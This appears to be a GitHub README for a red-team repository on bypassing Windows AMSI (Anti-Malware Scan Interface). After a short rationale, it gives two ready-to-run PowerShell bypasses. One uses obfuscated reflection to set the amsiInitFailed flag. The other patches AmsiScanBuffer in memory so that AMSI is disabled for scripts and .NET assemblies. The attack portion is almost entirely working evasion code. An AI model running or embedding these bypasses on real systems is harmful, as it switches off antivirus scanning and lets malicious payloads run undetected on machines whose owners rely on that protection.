# AMSI-Bypass

![AMSI Bypass](https://github.com/keyuraghao/AMSI-Bypass/blob/main/POC.png)

In cybersecurity, bypassing AMSI (Anti-Malware Scan Interface) is highly critical, especially in red team operations where simulating real-world attacks helps organizations test their defenses. AMSI is designed to enhance the detection of malicious scripts and activities by antivirus and other security products. By bypassing AMSI, attackers can evade detection and execute malicious code without triggering alarms.

Here's why bypassing AMSI is crucial in red team engagements:

1. **Detection Evasion:** AMSI is integrated with many antivirus and endpoint protection solutions, making it a major hurdle for attackers. Bypassing AMSI allows malicious scripts and payloads to evade detection, increasing the success rate of attacks.

2. **Real-World Simulation:** Red team exercises aim to mimic advanced threats and techniques used by real attackers. Since sophisticated adversaries actively develop AMSI bypasses, red teams must replicate these techniques to assess defensive effectiveness.

3. **Effectiveness Testing:** Organizations invest in security products that depend heavily on AMSI. Red teams bypass AMSI to validate whether these products can detect and respond to advanced evasion attempts.

4. **Risk Assessment:** Demonstrating AMSI bypasses helps organizations understand real-world impact, prioritize mitigations, and refine their threat models.

5. **Defense Improvement:** Successful AMSI evasion reveals detection gaps that defenders can later enhance.

In short, AMSI bypassing is a critical technique for red team operations to effectively explore internal infrastructure without triggering detection.

---

# AMSI Bypass Methods

## **PowerShell-only Bypass**
This bypass prevents the `ScriptContainedMaliciousContent` AMSI check, useful for bypassing PowerShell script scanning.  
However, it **does not** bypass .NET assembly scanning.

```powershell
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")
```
# **Global**

Disable all AMSI protections, including .NET assemblies

```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
